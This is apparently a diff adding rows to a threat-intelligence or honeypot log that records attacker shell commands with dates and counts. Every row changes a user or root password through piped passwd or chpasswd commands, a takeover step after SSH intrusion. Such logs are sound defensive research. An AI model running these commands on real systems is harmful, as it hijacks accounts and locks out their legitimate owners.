+"echo ""hb@2025\nPHVf6mgrrPsu\nPHVf6mgrrPsu\n""|passwd",21/11/2025 12:00,1
+"echo ""heni\n5c6yvREXRjm0\n5c6yvREXRjm0\n""|passwd",19/11/2025 00:00,1
+"echo ""heni\nPwb4Zm92END9\nPwb4Zm92END9\n""|passwd",19/11/2025 00:00,1
+"echo ""heni\nbufi9aFF8A1s\nbufi9aFF8A1s\n""|passwd",19/11/2025 00:00,1
+"echo ""ho\nHmNDlMkHsIho\nHmNDlMkHsIho\n""|passwd",20/11/2025 00:00,1
+"echo ""hola\ni8dgzyiUGNk1\ni8dgzyiUGNk1\n""|passwd",17/11/2025 12:00,1
+"echo ""hola\nmQR2cda6veU2\nmQR2cda6veU2\n""|passwd",17/11/2025 12:00,1
+"echo ""huawei123\nFIPSGEJ0DCCC\nFIPSGEJ0DCCC\n""|passwd",25/11/2025 12:00,1
+"echo ""huawei123\nmiIARhbS3UT0\nmiIARhbS3UT0\n""|passwd",25/11/2025 12:00,1
+"echo ""hung123\nDv73u67Utu9b\nDv73u67Utu9b\n""|passwd",22/11/2025 00:00,1
+"echo ""id\n2jend9M7CgK2\n2jend9M7CgK2\n""|passwd",20/11/2025 00:00,1
+"echo ""id\nrpn8LCadBuHr\nrpn8LCadBuHr\n""|passwd",20/11/2025 00:00,1
+"echo ""idbteam\nCo9DikgZYn5q\nCo9DikgZYn5q\n""|passwd",20/11/2025 00:00,1
+"echo ""idbteam\nMzPcvkfVWd13\nMzPcvkfVWd13\n""|passwd",20/11/2025 00:00,1
+"echo ""internal\nFIdKec8F7mNG\nFIdKec8F7mNG\n""|passwd",20/11/2025 00:00,1
+"echo ""internal\nvG2eAFl9zvwi\nvG2eAFl9zvwi\n""|passwd",20/11/2025 00:00,1
+"echo ""ir123\n3LR46r2Ytd1C\n3LR46r2Ytd1C\n""|passwd",29/11/2025 12:00,1
+"echo ""ir123\n8mXRXGwvCpaw\n8mXRXGwvCpaw\n""|passwd",29/11/2025 12:00,1
+"echo ""ir123\nWse4TeisVCsL\nWse4TeisVCsL\n""|passwd",29/11/2025 12:00,1
+"echo ""ir123\ngt3ulf7MWZG4\ngt3ulf7MWZG4\n""|passwd",29/11/2025 12:00,1
+"echo ""jason\n0K2ng1jbGq3g\n0K2ng1jbGq3g\n""|passwd",17/11/2025 00:00,1
+"echo ""jason\nJglHvgD8HVyR\nJglHvgD8HVyR\n""|passwd",17/11/2025 00:00,1
+"echo ""jay123\nE8CJAsBcNsvS\nE8CJAsBcNsvS\n""|passwd",16/11/2025 00:00,1
+"echo ""jay123\nyufOPhxujMRN\nyufOPhxujMRN\n""|passwd",16/11/2025 00:00,1
+"echo ""jenkins\n99QjBUuhCYTb\n99QjBUuhCYTb\n""|passwd",24/11/2025 00:00,1
+"echo ""jenkins\nAIChx9PH31B1\nAIChx9PH31B1\n""|passwd",24/11/2025 00:00,1
+"echo ""jeremy\nRHwbTrbzvmrh\nRHwbTrbzvmrh\n""|passwd",25/11/2025 00:00,1
+"echo ""jeremy\nlPigvHmkzQMh\nlPigvHmkzQMh\n""|passwd",25/11/2025 00:00,1
+"echo ""jmarquez\n2CIrUumchmhh\n2CIrUumchmhh\n""|passwd",28/11/2025 12:00,1
+"echo ""jmarquez\n2Vi3RCs6cLwB\n2Vi3RCs6cLwB\n""|passwd",28/11/2025 12:00,1
+"echo ""jmarquez\n2pBefkRTlXdw\n2pBefkRTlXdw\n""|passwd",28/11/2025 12:00,1
+"echo ""jmarquez\nQErH2EKuSk8r\nQErH2EKuSk8r\n""|passwd",28/11/2025 12:00,1
+"echo ""jmarquez\ncuins86dJ2xU\ncuins86dJ2xU\n""|passwd",28/11/2025 12:00,1
+"echo ""jmarquez\ne0doEoQ2wCff\ne0doEoQ2wCff\n""|passwd",28/11/2025 12:00,1
+"echo ""john@123\nuSXAhFy9B0eg\nuSXAhFy9B0eg\n""|passwd",30/11/2025 00:00,1
+"echo ""jrodrig\nkBc6bxGz0N2U\nkBc6bxGz0N2U\n""|passwd",30/11/2025 00:00,1
+"echo ""kafka123\nBCA6p84kfysS\nBCA6p84kfysS\n""|passwd",27/11/2025 00:00,1
+"echo ""kafka123\nXMC2Au3xT2H3\nXMC2Au3xT2H3\n""|passwd",27/11/2025 00:00,1
+"echo ""kali@123\nDMub3Qy0MG06\nDMub3Qy0MG06\n""|passwd",24/11/2025 00:00,1
+"echo ""karthik123\nysLodIrqEX30\nysLodIrqEX30\n""|passwd",17/11/2025 12:00,1
+"echo ""lam\nCIp8hmIKqQIU\nCIp8hmIKqQIU\n""|passwd",21/11/2025 00:00,1
+"echo ""lana\nXVOKShcBpf14\nXVOKShcBpf14\n""|passwd",18/11/2025 00:00,1
+"echo ""localhost\nZqIfiY2qvF5a\nZqIfiY2qvF5a\n""|passwd",27/11/2025 00:00,1
+"echo ""localhost\nt5heJI6NFhAH\nt5heJI6NFhAH\n""|passwd",27/11/2025 00:00,1
+"echo ""lol\nbRprsITmByLO\nbRprsITmByLO\n""|passwd",18/11/2025 00:00,1
+"echo ""magento@123\nli5hdTYVceDd\nli5hdTYVceDd\n""|passwd",28/11/2025 00:00,1
+"echo ""mainuser\ndJ6KU5s1wWNB\ndJ6KU5s1wWNB\n""|passwd",20/11/2025 00:00,1
+"echo ""mainuser\nleYW890j8yU1\nleYW890j8yU1\n""|passwd",20/11/2025 00:00,1
+"echo ""mana\nKLyVXAw6MFA1\nKLyVXAw6MFA1\n""|passwd",23/11/2025 00:00,1
+"echo ""mana\nLWU3sNXAAij5\nLWU3sNXAAij5\n""|passwd",23/11/2025 00:00,1
+"echo ""mana\nat3bytVYnXZs\nat3bytVYnXZs\n""|passwd",23/11/2025 00:00,1
+"echo ""martin123\nXkydJDhweg3O\nXkydJDhweg3O\n""|passwd",25/11/2025 12:00,1
+"echo ""max@123\n9sQGjwvkvHIT\n9sQGjwvkvHIT\n""|passwd",30/11/2025 00:00,1
+"echo ""max@123\nzaWItxLKe4Gb\nzaWItxLKe4Gb\n""|passwd",30/11/2025 00:00,1
+"echo ""mcserver@123\nEJdMF3QilDo5\nEJdMF3QilDo5\n""|passwd",25/11/2025 00:00,1
+"echo ""mcserver@123\nvR5OqcVgkcGM\nvR5OqcVgkcGM\n""|passwd",25/11/2025 00:00,1
+"echo ""mirco\nPJlnKjk8zScM\nPJlnKjk8zScM\n""|passwd",15/11/2025 12:00,1
+"echo ""mithun\nDFOH2DRJ73WI\nDFOH2DRJ73WI\n""|passwd",23/11/2025 00:00,1
+"echo ""monika123\nhEhkCK1xnw8h\nhEhkCK1xnw8h\n""|passwd",17/11/2025 00:00,1
+"echo ""mostafa1\nuv4NEeBzjiP5\nuv4NEeBzjiP5\n""|passwd",18/11/2025 00:00,1
+"echo ""mqm@123\nBGmHkEz5Cb4g\nBGmHkEz5Cb4g\n""|passwd",30/11/2025 00:00,1
+"echo ""mqm@123\ncb0MT7mTIKkM\ncb0MT7mTIKkM\n""|passwd",30/11/2025 00:00,1
+"echo ""mysql@1234\nA1pXYtSvrP4j\nA1pXYtSvrP4j\n""|passwd",16/11/2025 00:00,1
+"echo ""mysql@1234\nEuWtYWfpmUzx\nEuWtYWfpmUzx\n""|passwd",16/11/2025 00:00,1
+"echo ""newpassword\ntC7nePLju7PX\ntC7nePLju7PX\n""|passwd",15/11/2025 00:00,1
+"echo ""newuser123\ncB7D6wXZsZ72\ncB7D6wXZsZ72\n""|passwd",29/11/2025 00:00,1
+"echo ""nguyen\nYXa6dMEDr1rB\nYXa6dMEDr1rB\n""|passwd",18/11/2025 00:00,1
+"echo ""nguyen\nh8wTvqHeGpLf\nh8wTvqHeGpLf\n""|passwd",18/11/2025 00:00,1
+"echo ""nguyen\nzedWtgTC2GVz\nzedWtgTC2GVz\n""|passwd",18/11/2025 00:00,1
+"echo ""nishant123\njvHpktqbYIKb\njvHpktqbYIKb\n""|passwd",24/11/2025 00:00,1
+"echo ""nishant123\nweTNxkvZrwpA\nweTNxkvZrwpA\n""|passwd",24/11/2025 00:00,1
+"echo ""nodered\n8C4yy87xxxDk\n8C4yy87xxxDk\n""|passwd",19/11/2025 00:00,1
+"echo ""o2\nADTfie8nt1v4\nADTfie8nt1v4\n""|passwd",22/11/2025 00:00,1
+"echo ""o2\nLrVziApA6wFE\nLrVziApA6wFE\n""|passwd",22/11/2025 00:00,1
+"echo ""o2\nP3FB1oWmEGaL\nP3FB1oWmEGaL\n""|passwd",22/11/2025 00:00,1
+"echo ""o2\nuEeVnIllhW8r\nuEeVnIllhW8r\n""|passwd",22/11/2025 00:00,1
+"echo ""o2\nuk0IdTjl7zcQ\nuk0IdTjl7zcQ\n""|passwd",22/11/2025 00:00,1
+"echo ""ob\nMs0ZmFrmTaz6\nMs0ZmFrmTaz6\n""|passwd",23/11/2025 00:00,1
+"echo ""odoo123\ntfGk7P10EWFx\ntfGk7P10EWFx\n""|passwd",29/11/2025 12:00,1
+"echo ""odoo15@123\n6sgLUX0NYSDn\n6sgLUX0NYSDn\n""|passwd",25/11/2025 12:00,1
+"echo ""openbravo@123\n1hZ4pQos2UX4\n1hZ4pQos2UX4\n""|passwd",25/11/2025 12:00,1
+"echo ""openbravo@123\nOob485iauUkO\nOob485iauUkO\n""|passwd",25/11/2025 12:00,1
+"echo ""openbravo@123\nZwiBFQ73TXQI\nZwiBFQ73TXQI\n""|passwd",25/11/2025 12:00,1
+"echo ""oracle#2026\nMhVbiXC2GQPO\nMhVbiXC2GQPO\n""|passwd",21/11/2025 00:00,1
+"echo ""oracle#2026\nnojIIhCR36V5\nnojIIhCR36V5\n""|passwd",21/11/2025 00:00,1
+"echo ""oracle01\nLg1v7KNjnIzj\nLg1v7KNjnIzj\n""|passwd",25/11/2025 12:00,1
+"echo ""oracle01\naQr7PLElG8Sv\naQr7PLElG8Sv\n""|passwd",25/11/2025 12:00,1
+"echo ""otrs\nNT2nOIod1Upa\nNT2nOIod1Upa\n""|passwd",22/11/2025 00:00,1
+"echo ""otrs\nbtS854lJ2zOP\nbtS854lJ2zOP\n""|passwd",22/11/2025 00:00,1
+"echo ""p\n1TtIb0Q12bPC\n1TtIb0Q12bPC\n""|passwd",22/11/2025 00:00,1
+"echo ""p\n2Z3KRliCF2P2\n2Z3KRliCF2P2\n""|passwd",23/11/2025 00:00,1
+"echo ""p\n6rCqdatOrGEn\n6rCqdatOrGEn\n""|passwd",22/11/2025 00:00,1
+"echo ""p\n7hMEzhhFoDkm\n7hMEzhhFoDkm\n""|passwd",22/11/2025 00:00,1
+"echo ""p\nELkxLkXAzwEY\nELkxLkXAzwEY\n""|passwd",22/11/2025 00:00,1
+"echo ""p\nGNlBmuQEhZ8N\nGNlBmuQEhZ8N\n""|passwd",23/11/2025 00:00,1
+"echo ""p\nITqXTozyPXDV\nITqXTozyPXDV\n""|passwd",22/11/2025 00:00,1
+"echo ""p\nWh1agkpLjT2S\nWh1agkpLjT2S\n""|passwd",22/11/2025 00:00,1
+"echo ""p\nX2ovOET6Rfyx\nX2ovOET6Rfyx\n""|passwd",22/11/2025 00:00,1
+"echo ""p\nYJojw9QQnRUt\nYJojw9QQnRUt\n""|passwd",23/11/2025 00:00,1
+"echo ""p\ncNDTqpopEElR\ncNDTqpopEElR\n""|passwd",22/11/2025 00:00,1
+"echo ""p\ndFHWm9pXK4DG\ndFHWm9pXK4DG\n""|passwd",23/11/2025 00:00,1
+"echo ""p\neeWg4FOvS2zl\neeWg4FOvS2zl\n""|passwd",22/11/2025 00:00,1
+"echo ""p\noFfd568bTYvT\noFfd568bTYvT\n""|passwd",23/11/2025 00:00,1
+"echo ""p\npXyjc78y4t3S\npXyjc78y4t3S\n""|passwd",23/11/2025 00:00,1
+"echo ""p\ntQF6qdfaiVl5\ntQF6qdfaiVl5\n""|passwd",23/11/2025 00:00,1
+"echo ""p\nu1FiqgYwAirw\nu1FiqgYwAirw\n""|passwd",23/11/2025 00:00,1
+"echo ""p\nw116M8oNGHyX\nw116M8oNGHyX\n""|passwd",23/11/2025 00:00,1
+"echo ""p\nzGyZWXKWi0GM\nzGyZWXKWi0GM\n""|passwd",23/11/2025 00:00,1
+"echo ""password\nAt5I5o7KI6mx\nAt5I5o7KI6mx\n""|passwd",20/11/2025 00:00,1
+"echo ""password\nDDDxLbvafIEx\nDDDxLbvafIEx\n""|passwd",20/11/2025 00:00,1
+"echo ""password\nDSMVNz8ME6KN\nDSMVNz8ME6KN\n""|passwd",16/11/2025 00:00,1
+"echo ""password\naiSH9FBbMm7D\naiSH9FBbMm7D\n""|passwd",20/11/2025 00:00,1
+"echo ""password\nfrDHmPMcoKX1\nfrDHmPMcoKX1\n""|passwd",15/11/2025 00:00,1
+"echo ""password\nmxQO1cHoDd40\nmxQO1cHoDd40\n""|passwd",29/11/2025 00:00,1
+"echo ""password\nt7EG85A3v9em\nt7EG85A3v9em\n""|passwd",29/11/2025 00:00,1
+"echo ""password\nzmTbZtfRHUNc\nzmTbZtfRHUNc\n""|passwd",15/11/2025 00:00,1
+"echo ""plunga471\nE8dQ9Mv8HmQz\nE8dQ9Mv8HmQz\n""|passwd",20/11/2025 00:00,1
+"echo ""plunga471\nhD5FbhJm0c7A\nhD5FbhJm0c7A\n""|passwd",20/11/2025 00:00,1
+"echo ""plunga471\npQig5vUizKxV\npQig5vUizKxV\n""|passwd",20/11/2025 00:00,1
+"echo ""plunga471\ntSZj7n7z3jsQ\ntSZj7n7z3jsQ\n""|passwd",20/11/2025 00:00,1
+"echo ""plunga471\nzaUQbIYBoML3\nzaUQbIYBoML3\n""|passwd",20/11/2025 00:00,1
+"echo ""pooja\nMHdEoAqWe2bD\nMHdEoAqWe2bD\n""|passwd",22/11/2025 00:00,1
+"echo ""posiflex123\n9ctNVkzrYcQT\n9ctNVkzrYcQT\n""|passwd",24/11/2025 00:00,1
+"echo ""profe\nAHXuVmTJqDK5\nAHXuVmTJqDK5\n""|passwd",17/11/2025 12:00,1
+"echo ""profe\nqhwqaBmg9tlv\nqhwqaBmg9tlv\n""|passwd",17/11/2025 12:00,1
+"echo ""proxyuser@123\nFQKHfG05LJGG\nFQKHfG05LJGG\n""|passwd",25/11/2025 00:00,1
+"echo ""proxyuser@123\nacEpe3aRkQjI\nacEpe3aRkQjI\n""|passwd",25/11/2025 00:00,1
+"echo ""proxyuser@123\ndBFjFg6WpIHW\ndBFjFg6WpIHW\n""|passwd",25/11/2025 00:00,1
+"echo ""qiyuesuo@123\nu3RxcW0vf7jO\nu3RxcW0vf7jO\n""|passwd",25/11/2025 12:00,1
+"echo ""qq123456\ngsV0cFaU4fKN\ngsV0cFaU4fKN\n""|passwd",19/11/2025 00:00,1
+"echo ""qwe123!@#\nNhFHVyaLLZpB\nNhFHVyaLLZpB\n""|passwd",29/11/2025 12:00,1
+"echo ""qwe123!@#\nRmjM7oDhoSIz\nRmjM7oDhoSIz\n""|passwd",29/11/2025 12:00,1
+"echo ""qwe123!@#\nzQf4hOlvepmJ\nzQf4hOlvepmJ\n""|passwd",29/11/2025 12:00,1
+"echo ""qwer1234\nCHskuQHlCjWC\nCHskuQHlCjWC\n""|passwd",18/11/2025 00:00,1
+"echo ""qwer1234\nuWoAnvIVggqh\nuWoAnvIVggqh\n""|passwd",18/11/2025 00:00,1
+"echo ""qwer1234\nwHQUzvPFqk9n\nwHQUzvPFqk9n\n""|passwd",18/11/2025 00:00,1
+"echo ""qwerty123456\nBI1E8jNdLAER\nBI1E8jNdLAER\n""|passwd",23/11/2025 00:00,1
+"echo ""qwerty123\nJRQhf43w1dd9\nJRQhf43w1dd9\n""|passwd",21/11/2025 00:00,1
+"echo ""qwerty123\nVbkS0BQqIzXw\nVbkS0BQqIzXw\n""|passwd",21/11/2025 00:00,1
+"echo ""qwerty123\nlp7aC8amL7r5\nlp7aC8amL7r5\n""|passwd",21/11/2025 00:00,1
+"echo ""qwerty123\nmI2vEFd0jAle\nmI2vEFd0jAle\n""|passwd",21/11/2025 00:00,1
+"echo ""radio@123\nY693BpK4daD3\nY693BpK4daD3\n""|passwd",29/11/2025 00:00,1
+"echo ""radio@123\nyFetvP5skI44\nyFetvP5skI44\n""|passwd",29/11/2025 00:00,1
+"echo ""rafael123\nrnZkcG88NCwy\nrnZkcG88NCwy\n""|passwd",23/11/2025 00:00,1
+"echo ""redis123\nZiTpxMFZg8Ke\nZiTpxMFZg8Ke\n""|passwd",26/11/2025 00:00,1
+"echo ""redis\nO95TtRpSOBqZ\nO95TtRpSOBqZ\n""|passwd",30/11/2025 00:00,1
+"echo ""redis\nqz20Qiuy7gLC\nqz20Qiuy7gLC\n""|passwd",30/11/2025 00:00,1
+"echo ""redmine\nAr4mZD22S5me\nAr4mZD22S5me\n""|passwd",30/11/2025 00:00,1
+"echo ""root:00fE5S3MYIEB""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:055o6RWt6YoK""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:0BX0klGaY4bA""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:0HP7vAb7xHK5""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:0MU1iMocWuF3""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:0i6sbHqCddVW""|chpasswd|bash",21/11/2025 12:00,1
+"echo ""root:0pZtEBIq1hnp""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:10iK56O3C8zp""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:121vQh3cHN4J""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:152a7Fwz29MC""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:1HLArTOK1bOu""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:1j0pqd6qCN9D""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:1sb4OLLAeZVC""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:1vlKxeQ8Y7VZ""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:1z2rv3CBK3IQ""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:24i1tsPrSilk""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:28Nnp65qv4Jg""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:2EQtOEXbQJkU""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:2HK1jf9hGZpn""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:2YvRGNPraDdO""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:2p4B2OMDHW6J""|chpasswd|bash",29/11/2025 12:00,1
+"echo ""root:2rPdrH1A0V6b""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:2wXHMazXYj3N""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:2xhMUydJmmGy""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:32ijK2Xm6Nrf""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:3KBs9Et8MfCe""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:3VpsrdN3kl9K""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:3ayhF30GuRXn""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:3vibgZiSpWZz""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:3zX330Lr3yLY""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:474Zo7FVq1ka""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:4KoFrHHrWA8W""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:4RoRb9hJUDl0""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:4TdMaXQMPpMk""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:4a8MoyqyyUAI""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:4rQAoPkhc3vB""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:4zq78W48C4U5""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:5EvLWA0mNJQk""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:5FYhz9O2SYls""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:5O2F8edZJUh3""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:5P2kD5UapNbj""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:5UIB8W2XxNR8""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:5YSiTip6ICli""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:5gMPQHsMkoxg""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:5nM4PBuALLfW""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:5tidbfRr9FPt""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:66R1wKhaW3eD""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:6CcqaDVcvVxk""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:6MBzKi0kBhBZ""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:6b0aZj9wOz0J""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:6q6HdzCceFt3""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:734pxlsNcM6s""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:7FtpRBnJfv2W""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:7GCvmxvcdN4r""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:7GDCqnwq1Siv""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:7KmYHBKVHJSN""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:7OCr8KLHQlcY""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:7Q4dISQKNJsy""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:7QFvioK5eIeB""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:7SYStBfUz7QN""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:7X1eRR61V3SA""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:7ZGI0AmvJCPz""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:7aLQTChZPoMY""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:7fcZR364pjxO""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:7jAomexuOr10""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:7le19mkAc0Ld""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:7wRAm2jgSszA""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:8Cvk3lu0jkB8""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:8NlEc6JICM98""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:8RX8XpwychIh""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:8r1e9zvuZmTx""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:8zxy6FaneVj9""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:94mpIxx5tuGT""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:9LxbgnRAt49l""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:9PQJiw9Xbw4b""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:9WgAuh7x8e0Y""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:9fuM5vRHf0lC""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:9wYkbKOywpt0""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:AB3ilngWJPnw""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:AFzPrW8uH1cm""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:AYTwczOe5Es7""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:AhQLgQfDI2W1""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:AyV4fUVwBe2A""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:B4dSKbN16ynB""|chpasswd|bash",20/11/2025 12:00,1
+"echo ""root:B6PqdjLx7LOn""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:BBadlXlQHcIP""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:BHO7h8OMG5s5""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:BPD0vbTP9Spr""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:BgSYvd1NPRkU""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:BqWCDbxuybiC""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:C5nQJf0t59rR""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:C64VzFQNfIqw""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:CHNRn0Jrbotr""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:CObFegTW5Dj9""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:CSAsm1gP4AaI""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:Ciy3XdRyeDdj""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:ClkKQ00wwkeX""|chpasswd|bash",21/11/2025 12:00,1
+"echo ""root:D9a5l8lI1Zq1""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:DEHZ5aqeRPcJ""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:DSmiCGe2aKtG""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:DddJOJ8ZeILb""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:Dh4TSaFMa5u5""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:DjK3LPNSsjaL""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:DwpDGpg8z2mF""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:Dy2jWcnyO5Ua""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:Dy2p4Z2lOLp2""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:E9zOwjUDro4o""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:EJGkAsnB2ZGb""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:EJO8ZqTidm2N""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:EMjKyGn75x8N""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:EnbGGpCiGK4k""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:EowBWO4xURys""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:EsG2E3Phjush""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:EwsKkKQMOqFu""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:FJ35FTlmE3k1""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:FL6toJStm7Wi""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:FPxoufUYB1qv""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:FUb4pAuTAwdk""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:FiC5n9vrkFIZ""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:G0K7zHYHQkkW""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:G4v5ZmMjx515""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:G6kQsIkazLah""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:GClnpjpSohw9""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:GRNbjnpphgCh""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:GWQbbRifBD3g""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:Gd9nN3Y1uAcm""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:Giivkw9XLKre""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:GnzE0cmbpD53""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:GpeD5k3N2maf""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:GxKj2kZKf1MN""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:H0oNotF4gKKN""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:HTsMvgAIpzth""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:HYnFCFPDdVej""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:Hd2nl38lnuVF""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:HdWJKwJSaWvi""|chpasswd|bash",29/11/2025 12:00,1
+"echo ""root:HhGJvyGyzD0Q""|chpasswd|bash",26/11/2025 12:00,1
+"echo ""root:HhWveswk6FZH""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:HiRpDm3iteyd""|chpasswd|bash",29/11/2025 12:00,1
+"echo ""root:HoZ2YKtNM9Xi""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:HwTzg5Zw4spd""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:I1U7s6r8cZJn""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:I7rRqB3gwbSO""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:IDcmaMj4m71K""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:IFITQepkQ02D""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:IIrR7wmNyMrZ""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:ILVtcMMHv2eh""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:ILchkvX9wo1y""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:Ij2kgrdGobkS""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:J1Ra75hde27f""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:J5qvaD8Fg2xR""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:J7ZcExKw7NHO""|chpasswd|bash",21/11/2025 00:00,1
